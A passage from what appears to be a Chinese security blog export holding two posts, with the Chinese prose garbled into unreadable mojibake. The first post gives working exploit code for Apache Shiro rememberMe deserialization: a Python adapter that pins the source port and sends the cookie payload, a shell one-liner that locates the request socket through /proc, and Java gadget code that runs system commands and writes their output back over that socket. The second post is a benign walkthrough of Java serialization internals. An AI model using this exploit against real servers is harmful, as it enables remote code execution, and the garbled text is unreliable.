<h2 id="æ•…äº‹çš„èµ·å› "><a href="#æ•…äº‹çš„èµ·å› " class="headerlink" title="æ•…äº‹çš„èµ·å› "></a>æ•…äº‹çš„èµ·å› </h2><p>ä¸€ç›´è§‰å¾—shiroååºåˆ—åŒ–æ˜¯ä¸€ä¸ªå¾ˆèˆ’æœçš„æ´ï¼ŒpayloadåŸç”ŸåŠ å¯†ï¼ˆæ— ç‰¹å¾ï¼‰ï¼Œå®æˆ˜ä¸­æœ‰æ¦‚ç‡é‡è§å¹¶ä¸”åˆæ˜¯javaååºåˆ—åŒ–æ´æ‰€ä»¥å±å®³åˆå¾ˆå¤§ã€‚ä¸è¿‡å°½ç®¡è¿™æ ·shiroæ‰“èµ·æ¥ä¾ç„¶æœ‰javaååºåˆ—åŒ–çš„ä¸¤ä¸ªç—›ç‚¹ã€‚ç¬¬ä¸€æ˜¯å¯ç”¨çš„gadgetï¼Œç¬¬äºŒä¸ªå¸¦å†…å›æ˜¾çš„é—®é¢˜ã€‚ä¸è¿‡æŸå¤©åœ¨åˆ·twçš„æ—¶å€™å‘ç°ç¬¬äºŒä¸ªç—›ç‚¹å›½å†…å·²ç»æœ‰å¤§ä½¬æœ‰æˆç†Ÿè§£å†³æ–¹æ¡ˆäº†ã€‚<br><img src="1582539071748-2900a239-4915-465f-9d8a-849a2a102b53.png#align=left&display=inline&height=728&name=image.png&originHeight=1160&originWidth=1188&size=1236427&status=done&style=none&width=746" alt="image.png"></p>
<p>æ³¨æ„çœ‹å›¾ï¼Œshiroçš„å›æ˜¾å¹¶ä¸åœ¨httpå“åº”åŒ…ä¸­è€Œæ˜¯åœ¨httpå“åº”åŒ…ä¹‹å‰ï¼Œå¾ˆç„å­¦çš„å›æ˜¾å¯¹å§ï¼Ÿè”æƒ³æœ€è¿‘åœ¨çœ‹äº†ä¸€ç¯‡æ–‡ç« <a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">é€šæ€æ¼æ´åˆ©ç”¨å›æ˜¾æ–¹æ³•-linuxå¹³å°</a>ï¼ŒæŒ‰æˆ‘çš„ç†è§£è¿™ç¯‡æ–‡ç« çš„æ€è·¯å¤§è‡´æ˜¯é€šè¿‡javaååºåˆ—åŒ–æ‰§è¡Œä»£ç &amp;&amp;ç³»ç»Ÿå‘½ä»¤è·å–åˆ°å‘èµ·è¿™æ¬¡è¯·æ±‚æ—¶æœåŠ¡ç«¯socketçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç„¶ååœ¨æ–‡ä»¶æè¿°ç¬¦å†™å…¥å›æ˜¾å†…å®¹ã€‚ä¸Šå›¾çš„å›æ˜¾æ•ˆæœå’Œè¿™ç§æ€è·¯éå¸¸ç›¸ä¼¼ã€‚</p>
<h2 id="æŠ€æœ¯çš„éš¾ç‚¹"><a href="#æŠ€æœ¯çš„éš¾ç‚¹" class="headerlink" title="æŠ€æœ¯çš„éš¾ç‚¹"></a>æŠ€æœ¯çš„éš¾ç‚¹</h2><p>å®ç°è¿™ç§æŠ€æœ¯çš„éš¾ç‚¹åœ¨äºå¦‚ä½•é€šè¿‡javaååºåˆ—åŒ–æ‰§è¡Œä»£ç &amp;&amp;ç³»ç»Ÿå‘½ä»¤è·å–æœ¬æ¬¡httpè¯·æ±‚ç”¨åˆ°socketçš„æ–‡ä»¶æè¿°ç¬¦ã€‚å› ä¸ºåœ¨æœåŠ¡å™¨å¯¹å¤–å¼€æ”¾çš„æ—¶ä¼šæœ‰fdä¸‹ä¼šæœ‰è®¸å¤šsocketæè¿°ç¬¦ã€‚<br><img src="1582540730651-655c7e72-52c8-485d-b9f0-4cb038a724cb.png#align=left&display=inline&height=456&name=image.png&originHeight=690&originWidth=1130&size=173102&status=done&style=none&width=746" alt="image.png"><br>è¿™é‡Œç»™å‡ºè·å–socketæ–‡ä»¶æè¿°ç¬¦æˆ‘çš„ä¸€ä¸ªä½é…ç‰ˆæ€è·¯åŠå®ç°ï¼Œè‡³äºä¸ºå•¥æ˜¯ä½é…ç‰ˆä¼šåœ¨æ–‡ç« æœ€åæåˆ°ã€‚é¦–å…ˆæ³¨æ„åˆ°socketåé¢çš„æ•°å­—ä¸åŒï¼Œè¿™ä¸ªæ•°å­—å®é™…ä¸Šæ˜¯inodeå·ã€‚è¿™ä¸ªinodeå·ä¹Ÿå‡ºç°åœ¨/proc/net/tcpä¸­ã€‚<br><img src="1582540888379-0c087050-f90a-4881-8297-a465b7e28646.png#align=left&display=inline&height=135&name=image.png&originHeight=270&originWidth=2294&size=57686&status=done&style=none&width=1147" alt="image.png"><br>æ³¨æ„åˆ°æ¯ä¸€ä¸ªinodeå·å¯¹åº”å”¯ä¸€æ¡tcpè¿æ¥ä¿¡æ¯å¹¶ä¸”è¿™æ¡ä¿¡æ¯ä¸­çš„remote_addressé¡¹è®°å½•äº†è¿œç¨‹è¿æ¥çš„ipå’Œç«¯å£å·ã€‚è¯´åˆ°è¿™é‡Œå…¶å®è·å–socketæ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼šé€šè¿‡æŒ‡å®šå®¢æˆ·ç«¯å‘èµ·è¯·æ±‚çš„æºç«¯å£å·ï¼Œé€šè¿‡cat grep awkç»„åˆå¤§æ³•åœ¨tcpè¡¨ä¸­æ‹¿åˆ°inodeï¼ŒæŠŠæ‹¿åˆ°çš„inodeå·å†å»fdç›®å½•ä¸‹å†ç”¨cat grep wakå¤§æ³•æ‹¿åˆ°æ–‡ä»¶æè¿°ç¬¦çš„æ•°å­—ï¼Œå†è°ƒç”¨javaä»£ç æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦å³å¯å®ç°å¸¦å†…å›æ˜¾ã€‚</p>
<h2 id="å®ç°ç»†èŠ‚"><a href="#å®ç°ç»†èŠ‚" class="headerlink" title="å®ç°ç»†èŠ‚"></a>å®ç°ç»†èŠ‚</h2><h3 id="æŒ‡å®šç«¯å£å·"><a href="#æŒ‡å®šç«¯å£å·" class="headerlink" title="æŒ‡å®šç«¯å£å·"></a>æŒ‡å®šç«¯å£å·</h3><p>requestsåº“å¯ä»¥é‡æ–°å®ç°Httpè¾¾åˆ°æŒ‡å®šè¯·æ±‚ç«¯å£çš„ç›®çš„ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class SourcePortAdapter(HTTPAdapter):</span><br><span class="line">    <span class="string">""</span><span class="string">""</span>Transport adapter<span class="string">" that allows us to set the source port."</span><span class="string">""</span></span><br><span class="line">    <span class="function">def <span class="title">__init__</span><span class="params">(self, port, *args, **kwargs)</span>:</span></span><br><span class="line"><span class="function">        self._source_port </span>= port</span><br><span class="line">        <span class="keyword">super</span>(SourcePortAdapter, self).__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function">def <span class="title">init_poolmanager</span><span class="params">(self, connections, maxsize, block=False)</span>:</span></span><br><span class="line"><span class="function">        self.poolmanager </span>= PoolManager(</span><br><span class="line">            num_pools=connections, maxsize=maxsize,</span><br><span class="line">            block=block, source_address=(<span class="string">''</span>, self._source_port))</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(target, SourcePortAdapter(randNum))</span><br><span class="line">resp = s.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">5</span>, headers=headers, verify=False)</span><br></pre></td></tr></table></figure>

<h3 id="è·å–socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦"><a href="#è·å–socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="è·å–socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦"></a>è·å–socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦</h3><p>æ•´ä¸ªæµç¨‹ä½¿ç”¨çš„å‘½ä»¤å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a=`cat /proc/$PPID/net/tcp6|awk <span class="string">'&#123;if($10&gt;0)print&#125;'</span>|grep -i %s|awk <span class="string">'&#123;print $10&#125;'</span>`;</span><br><span class="line">b=`ls -l /proc/$PPID/fd|grep $a|awk <span class="string">'&#123;print $9&#125;'</span>`;</span><br><span class="line">echo -n $b</span><br></pre></td></tr></table></figure>

<h3 id="å¾€æ–‡ä»¶æè¿°ä¸­å†™æ•°æ®"><a href="#å¾€æ–‡ä»¶æè¿°ä¸­å†™æ•°æ®" class="headerlink" title="å¾€æ–‡ä»¶æè¿°ä¸­å†™æ•°æ®"></a>å¾€æ–‡ä»¶æè¿°ä¸­å†™æ•°æ®</h3><p>ç°åœ¨å‡è®¾shiroå­˜åœ¨ååºåˆ—åŒ–å¹¶ä¸”æ‰€ç”¨gadgetçš„æœ«ç«¯æ˜¯èµ°çš„TemplatesImplï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠysoserialä¸­çš„ç¡¬ç¼–ç çš„å‘½ä»¤æ‰§è¡Œæ”¹æˆä¸‹é¢è¿™æ ·çš„ä»£ç æ‰§è¡Œã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] cmd = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"a=`cat /proc/$PPID/net/tcp6|awk '&#123;if($10&gt;0)print&#125;'|grep -i %s|awk '&#123;print $10&#125;'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '&#123;print $9&#125;'`;echo -n $b"</span>&#125;;</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">java.io.InputStreamReader isr  = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">java.io.BufferedReader br = <span class="keyword">new</span> java.io.BufferedReader(isr);</span><br><span class="line">StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">String line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num = Integer.valueOf(stringBuilder.toString()).intValue();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"ifconfig"</span>&#125;;</span><br><span class="line"></span><br><span class="line">in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">isr  = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">br = <span class="keyword">new</span> java.io.BufferedReader(isr);</span><br><span class="line">stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String ret = stringBuilder.toString();</span><br><span class="line">java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]&#123;Integer.TYPE&#125;);</span><br><span class="line">c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java.io.FileOutputStream os = <span class="keyword">new</span> java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> Integer(num)&#125;));</span><br><span class="line">os.write(ret.getBytes());</span><br><span class="line">os.close();</span><br></pre></td></tr></table></figure>

<p>æˆ‘è¿™ç§ä½é…ç‰ˆæŒ‡ä»¤ifconfigåæ•ˆæœå®ç°æ•ˆæœå¦‚ä¸‹ï¼ŒæœåŠ¡ç«¯ä¼šç›´æ¥è¿”å›æ•°æ®å¹¶æ–­æ‰è¿æ¥ï¼Œæ‰€ä»¥æ²¡æœ‰äº†åé¢httpå“åº”åŒ…ï¼Œrequestsåº“æ— æ³•è¯†åˆ«è¿”å›çš„å†…å®¹æŠ¥é”™ã€‚<br><img src="1582541605629-07be9057-523f-47f1-aa13-3f1bc0369811.png#align=left&display=inline&height=259&name=image.png&originHeight=518&originWidth=3122&size=599181&status=done&style=none&width=1561" alt="image.png"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol>
<li>æˆ‘è¿™ç§æ–¹æ³•å› ä¸ºéœ€è¦ä¿è¯è¯·æ±‚æºç«¯å£ï¼Œæ‰€ä»¥æ²¡åŠæ³•æŒ‰ç…§å›¾ä¸­å¸ˆå‚…å®ç°çš„ä¸€æ ·åœ¨burpä¸­ï¼ˆburpä»£ç†åå‘èµ·è¯·æ±‚çš„ç«¯å£ä¸å¯æ§ï¼‰ã€‚åŒæ ·çš„é“ç†å¦‚æœè„†å¼±çš„shiroåº”ç”¨åœ¨åä»£åé¢ï¼Œå› ä¸ºåä»£çš„æºç«¯å£ä¸å¯é¢„æµ‹æ‰€ä»¥æ²¡åŠæ³•ç”¨è¿™ç§ä½é…ç‰ˆæ–¹æ¡ˆæ‹¿åˆ°å›æ˜¾ã€‚ä½†å®é™…æƒ…å†µä¸å‡ºç½‘çš„shiroè‚¯å®šæ˜¯åœ¨å†…ç½‘é‡Œé¢çš„ï¼Œæ‰€ä»¥ä»è¿™è§’åº¦æƒ³æƒ³è¿˜æœ‰ç‚¹é¸¡è‚‹ï¼Œå°±å½“æŠ›ç –å¼•ç‰äº†ï½</li>
<li>åœ¨ä¸Šé¢å¼•ç”¨çš„æ–‡ç« ä¸­æåˆ°äº† â€œjvmæ‰€æœ‰çš„å¯¹è±¡éƒ½å­˜å‚¨åœ¨å †å†…å­˜ä¸­ï¼Œä¹Ÿè®¸å¯ä»¥é€šè¿‡æŸç§æ–¹æ³•ç›´æ¥è·å–å­˜å‚¨åœ¨å †å†…å­˜ä¸­çš„socketå¯¹è±¡å®ç°å›æ˜¾â€ï¼Œæˆ‘çŒœå¯ä»¥åœ¨burpé‡Œé¢åˆ©ç”¨çš„æƒ…å†µåº”è¯¥æ˜¯é€šè¿‡æŸç§é»‘é­”æ³•è·å–åˆ°äº†æœ¬æ¬¡è¯·æ±‚çš„socketå¯¹è±¡äº†ï¼ˆæˆ–è€…æ˜¯æ›´åº•å±‚çš„æ–¹æ³•ï¼‰æ‰€ä»¥æ‰ä¸è¦ä»¥å®¢æˆ·ç«¯æºå£ä½œä¸ºè¿‡æ»¤æ¡ä»¶ã€‚</li>
<li>å†™åˆ°è¿™å¿½ç„¶æƒ³èµ·ï¼Œé‚£ä¸ªå›¾ç‰‡payloadè²Œä¼¼æ²¡æœ‰æ‰“ç ï¼Œæˆ–è®¸æŠŠpayloadç”¨shiroå¸¸è§çš„å¯†é’¥æ’ä¸€ä¸‹æ’å¯ä»¥çœ‹åˆ°æ ‡å‡†ç‰ˆæ€è·¯çš„ç‰‡æ®µï¼Ÿä½“åŠ›ä¸å¤Ÿï¼Œæºœäº†ã€‚</li>
</ol>
<p>ç ”ç©¶è¿™ä¸ªé—®é¢˜æ—¶å€™ä¹Ÿè¯·æ•™äº†ç›¸å…³çš„å¤§å“¥æ¥æ”¶åˆ°äº†ä¸€äº›æç¤ºï¼Œå› ä¸ºå±äºä»–äººçŸ¥è¯†äº§æƒï¼Œæ–‡ç« å¹¶æœªæåŠã€‚åœ¨æ­¤è°¢è¿‡æŒ‡ç‚¹æˆ‘çš„å¤§å“¥ä»¬ã€‚</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŸç”Ÿåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä»£ç ç®€è¦åˆ†æ</title>
    <url>/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- å†™è¿™ç¯‡æ–‡ç« ç›®çš„ä¸»è¦åœ¨äºè¿›ä¸€æ­¥ç†è§£ä½•ä¸ºjavaåŸç”Ÿååºåˆ—åŒ–ï¼Œå¹¶ä¸”å›ç­”å¦‚ä¸‹çš„å‡ ä¸ªé—®é¢˜ã€‚ -->
<!-- more -->

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å†™è¿™ç¯‡æ–‡ç« ç›®çš„ä¸»è¦åœ¨äºè¿›ä¸€æ­¥ç†è§£ä½•ä¸ºjavaåŸç”Ÿååºåˆ—åŒ–ï¼Œå¹¶ä¸”å›ç­”çš„å‡ ä¸ªé—®é¢˜ã€‚</p>
<ol>
<li>ä¸ºä»€ä¹ˆå°±javaååºåˆ—åŒ–ä½¿ç”¨è€Œè¨€æ˜¯ååºåˆ—åŒ–ç±»çš„readObjectå¼€å§‹ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆresolveClassæ–¹æ³•å¯ä»¥é˜²å¾¡ååºåˆ—åŒ–ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–æ•°æ®åé¢æ’å…¥è„æ•°æ®ä¼šä¸ä¼šå½±å“ååºåˆ—åŒ–ï¼Ÿ</li>
</ol>
<p><strong>ps: ç¢äºæ°´å¹³æœ‰é™åªä¼šåœ¨ä»£ç è¡¨å±‚åšå®è§‚å’Œä¸­è§‚çš„åˆ†æï¼Œå¹¶ä¸ä¼šæ·±å…¥ç‰¹åˆ«åº•å±‚ã€‚</strong></p>
<h2 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h2><p>åºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> money = <span class="number">100</span>;</span><br><span class="line">    String firstname = <span class="string">"cl0und"</span>;</span><br><span class="line">    String lastname = <span class="string">"lisan"</span>;</span><br><span class="line"></span><br><span class="line">    User()&#123;</span><br><span class="line">        System.out.println(<span class="string">"æ— å‚æ•°æ„é€ æ–¹æ³•"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectOutputStream oops = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> User());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Unserial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream oips = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        User user = (User) oips.readObject();</span><br><span class="line">        System.out.println(user.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><h3 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>é¢„å¤„ç†çš„æ„ä¹‰æ˜¯æ‹¿åˆ°ç±»çš„æè¿°ç¬¦ç±»ObjectStreamClassï¼Œåç»­å¯¹ç±»çš„å†…çœå’Œå†™å…¥åºåˆ—åŒ–æ•°æ®éƒ½ç”±ä»–å®Œæˆæˆ–è°ƒåº¦ã€‚<br><img src="1579071914321-a1cb1263-2c7b-4c2a-ac9e-ab59b368be6f.png#align=left&display=inline&height=268&name=image.png&originHeight=536&originWidth=2218&size=130937&status=done&style=none&width=1109" alt="image.png"></p>
<p><img src="1579072160993-ddec24eb-7894-4fa4-b0a3-6cc1525d0312.png#align=left&display=inline&height=499&name=image.png&originHeight=998&originWidth=2416&size=312156&status=done&style=none&width=1208" alt="image.png"></p>
<p><img src="1579072322762-373ead16-c408-4a20-b9c8-0e5afeb526a2.png#align=left&display=inline&height=79&name=image.png&originHeight=118&originWidth=1114&size=24543&status=done&style=none&width=746" alt="image.png"></p>
<h3 id="åºåˆ—åŒ–æ•°æ®"><a href="#åºåˆ—åŒ–æ•°æ®" class="headerlink" title="åºåˆ—åŒ–æ•°æ®"></a>åºåˆ—åŒ–æ•°æ®</h3><p>å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰ä¸‰æ­¥ï¼Œé¦–å…ˆæ˜¯TC_OBJECTï¼Œå…¶æ¬¡æ˜¯ç±»çš„å…ƒä¿¡æ¯ï¼Œæœ€åæ˜¯ç±»çš„å…·ä½“æ•°æ®ã€‚<br><img src="1579072894925-2b64c24f-c27e-4076-9680-ff51ad8934d7.png#align=left&display=inline&height=526&name=image.png&originHeight=1052&originWidth=2218&size=309500&status=done&style=none&width=1109" alt="image.png"></p>
<p>ç¬¬ä¸€æ­¥å°±å†™ä¸ªæ ‡å¿—å¤´ï¼Œæ¯”è¾ƒç®€å•æˆ‘ä»¬ä¸‹é¢ç›´æ¥ä»ç¬¬äºŒæ­¥å¼€å§‹çœ‹ã€‚</p>
<h4 id="writeClassDesc"><a href="#writeClassDesc" class="headerlink" title="writeClassDesc"></a>writeClassDesc</h4><p>åœ¨åºåˆ—åŒ–å¯¹è±¡çš„æ•°æ®ä¹‹å‰ï¼Œé¦–å…ˆä¼šæœ‰ä¸€ä¸ªå¯¹è±¡ç±»å‹çš„åˆ†ç±»åˆ¤æ–­ï¼Œè¿™é‡Œåˆ†æˆå››ç§ç±»å‹æ¥å¤„ç†å³nullç±»å‹ï¼ˆTC_NULLï¼‰ã€handleç±»å‹ï¼ˆTC_REFERENCEï¼‰ã€ä»£ç†ç±»å‹ï¼ˆTC_PROXYCLASSDESCï¼‰ã€æ™®é€šç±»å‹ï¼ˆTC_CLASSDESCï¼‰ã€‚æˆ‘ä»¬è¿™é‡Œçš„Useræ˜¯æ™®é€šçš„ç±»æ‰€ä»¥èµ°æœ€åçš„writeNonProxyDescã€‚<br><img src="1579072952655-5aaa96e0-5fdf-488a-ac94-8528a696d735.png#align=left&display=inline&height=265&name=image.png&originHeight=530&originWidth=2170&size=158579&status=done&style=none&width=1085" alt="image.png"></p>
<p>writeNonProxyDescä¼šå…ˆè°ƒç”¨writeClassDescriptoræŠŠè‡ªå·±çš„å±æ€§ä¿¡æ¯å†™å…¥ï¼Œç„¶å<strong>é€’å½’è°ƒç”¨writeClassDescå†™å…¥çˆ¶ç±»å…ƒä¿¡æ¯</strong>ã€‚<br><img src="1579073424200-23b27228-c0e6-4226-87ea-39f9a62cd74a.png#align=left&display=inline&height=456&name=image.png&originHeight=912&originWidth=2570&size=266403&status=done&style=none&width=1285" alt="image.png"></p>
<p>ç»†çœ‹ä¸€ä¸‹writeClassDescriptorï¼Œè¿™é‡Œé¢ä¼šè°ƒç”¨writeNonProxyã€‚<br><img src="1579073626530-720d0886-3e01-4436-93f9-f965c7280d8b.png#align=left&display=inline&height=121&name=image.png&originHeight=198&originWidth=1220&size=40079&status=done&style=none&width=746" alt="image.png"></p>
<p>æœ€åè°ƒç”¨writeNonProxyï¼Œåœ¨forå¾ªç¯é‡Œé¢å†™å…¥å±æ€§ä¿¡æ¯ã€‚<br><img src="1579073604762-ebea518b-6e04-4df7-a251-edb41729238d.png#align=left&display=inline&height=612&name=image.png&originHeight=1224&originWidth=1920&size=311877&status=done&style=none&width=960" alt="image.png"></p>
<p>è¿™ä¸€æ®µçš„å†™å…¥å¦‚æœæœ€åç”¨dumpå‡ºæ¥ï¼Œå°±æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ã€‚<br><img src="1579073704276-07463dd6-ef7f-4174-b38b-b7d9f8e3c621.png#align=left&display=inline&height=678&name=image.png&originHeight=1224&originWidth=1346&size=143782&status=done&style=none&width=746" alt="image.png"></p>
<h4 id="writeSerialData"><a href="#writeSerialData" class="headerlink" title="writeSerialData"></a>writeSerialData</h4><p>æŠŠç±»å±æ€§ä¿¡æ¯å†™å»ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™ç±»å±æ€§å¯¹åº”çš„å…·ä½“å€¼äº†ã€‚<img src="1579074696395-fa1ba6b8-6c83-4273-9d87-20620d97374f.png#align=left&display=inline&height=691&name=image.png&originHeight=1382&originWidth=2290&size=431384&status=done&style=none&width=1145" alt="image.png"></p>
<p><img src="1579075103594-84570cfe-d6c5-477a-aa31-8be9626ab9cd.png#align=left&display=inline&height=734&name=image.png&originHeight=1468&originWidth=2392&size=472323&status=done&style=none&width=1196" alt="image.png"></p>
<p><em>ps:éåŸç”Ÿæ•°æ®ç±»å‹æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„ã€æšä¸¾ç±»å‹ã€å¯¹è±¡ã€‚</em><br>_<br>ä¸€ä¸ªå®Œæ•´çš„dumpå¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 4 - 0x00 04</span><br><span class="line">        Value - User - 0x55736572</span><br><span class="line">      serialVersionUID - 0xbb 67 4f fb 9b a9 d6 bb</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 4 - 0x00 04</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 5 - 0x00 05</span><br><span class="line">            Value - money - 0x6d6f6e6579</span><br><span class="line">        2:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 9 - 0x00 09</span><br><span class="line">            Value - firstname - 0x66697273746e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava&#x2F;lang&#x2F;String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">        3:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 8 - 0x00 08</span><br><span class="line">            Value - lastname - 0x6c6173746e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_REFERENCE - 0x71</span><br><span class="line">              Handle - 8257537 - 0x00 7e 00 01</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      User</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)20 - 0x00 00 00 14</span><br><span class="line">          money</span><br><span class="line">            (int)100 - 0x00 00 00 64</span><br><span class="line">          firstname</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 6 - 0x00 06</span><br><span class="line">                Value - cl0und - 0x636c30756e64</span><br><span class="line">          lastname</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 04</span><br><span class="line">                Length - 5 - 0x00 05</span><br><span class="line">                Value - lisan - 0x6c6973616e</span><br></pre></td></tr></table></figure>

